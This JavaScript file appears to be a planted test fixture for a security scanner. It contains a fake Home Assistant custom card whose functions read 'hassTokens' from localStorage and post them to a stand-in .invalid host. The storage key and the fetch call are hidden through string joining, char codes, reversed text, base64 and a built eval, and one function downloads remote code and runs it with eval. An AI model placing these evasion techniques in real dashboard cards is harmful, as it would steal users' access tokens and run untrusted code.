// PLANTED FIXTURE (0.14.0): a card that hides the names it uses by building them from
// pieces. Every send below must be reported as card-token-exfil, and every built name
// as card-hidden-name. Hosts are .invalid; nothing here is ever run.
const G = globalThis;

// 1. Names joined with .join(): the storage key and the sink.
function sendJoined() {
  const key = ["hass", "Tokens"].join("");
  const send = ["fe", "tch"].join("");
  const t = localStorage.getItem(key);
  G[send]("https://collect.hidden-card.invalid/a", { method: "POST", body: t });
}

// 2. Every global built from pieces.
function sendAllBuilt() {
  const ls = G[["local", "Storage"].join("")];
  const t = ls[["get", "Item"].join("")](["hass", "Tokens"].join(""));
  G[["fe", "tch"].join("")]("https://collect.hidden-card.invalid/b", { method: "POST", body: t });
}

// 3. "+" and .concat(), inline.
function sendConcat() {
  const t = localStorage.getItem("hass" + "Tokens");
  window.fetch("https://collect.hidden-card.invalid/c", { method: "POST", body: t });
  const u = localStorage.getItem("hass".concat("Tokens"));
  self.navigator.sendBeacon("https://collect.hidden-card.invalid/d", u);
}

// 4. Escapes, char codes, reversed text, base64.
function sendEncoded(hass) {
  const t = localStorage.getItem("\x68assTokens");
  const k = String.fromCharCode(104, 97, 115, 115, 84, 111, 107, 101, 110, 115);
  const v = localStorage.getItem("snekoTssah".split("").reverse().join(""));
  G[atob("ZmV0Y2g=")]("https://collect.hidden-card.invalid/e", { method: "POST", body: t + localStorage.getItem(k) + v });
  G[`fe${"tch"}`]("https://collect.hidden-card.invalid/f", { method: "POST", body: hass.auth.data.access_token });
}

// 5. Code assembled from pieces and run through a hidden eval.
function runBuilt() {
  const s = ["fet", 'ch("https://collect.hidden-card.invalid/g?t="+local', 'Storage.getItem("hass', 'Tokens"))'].join("");
  G[["ev", "al"].join("")](s);
}

// 6. Code downloaded and run (must stay high: card-eval-remote).
async function runDownloaded() {
  const r = await fetch("https://collect.hidden-card.invalid/code.js");
  eval(await r.text());
}

class HiddenCard extends HTMLElement {
  set hass(h) {
    sendJoined();
    sendAllBuilt();
    sendConcat();
    sendEncoded(h);
    runBuilt();
    runDownloaded();
  }
}
customElements.define("hidden-card", HiddenCard);
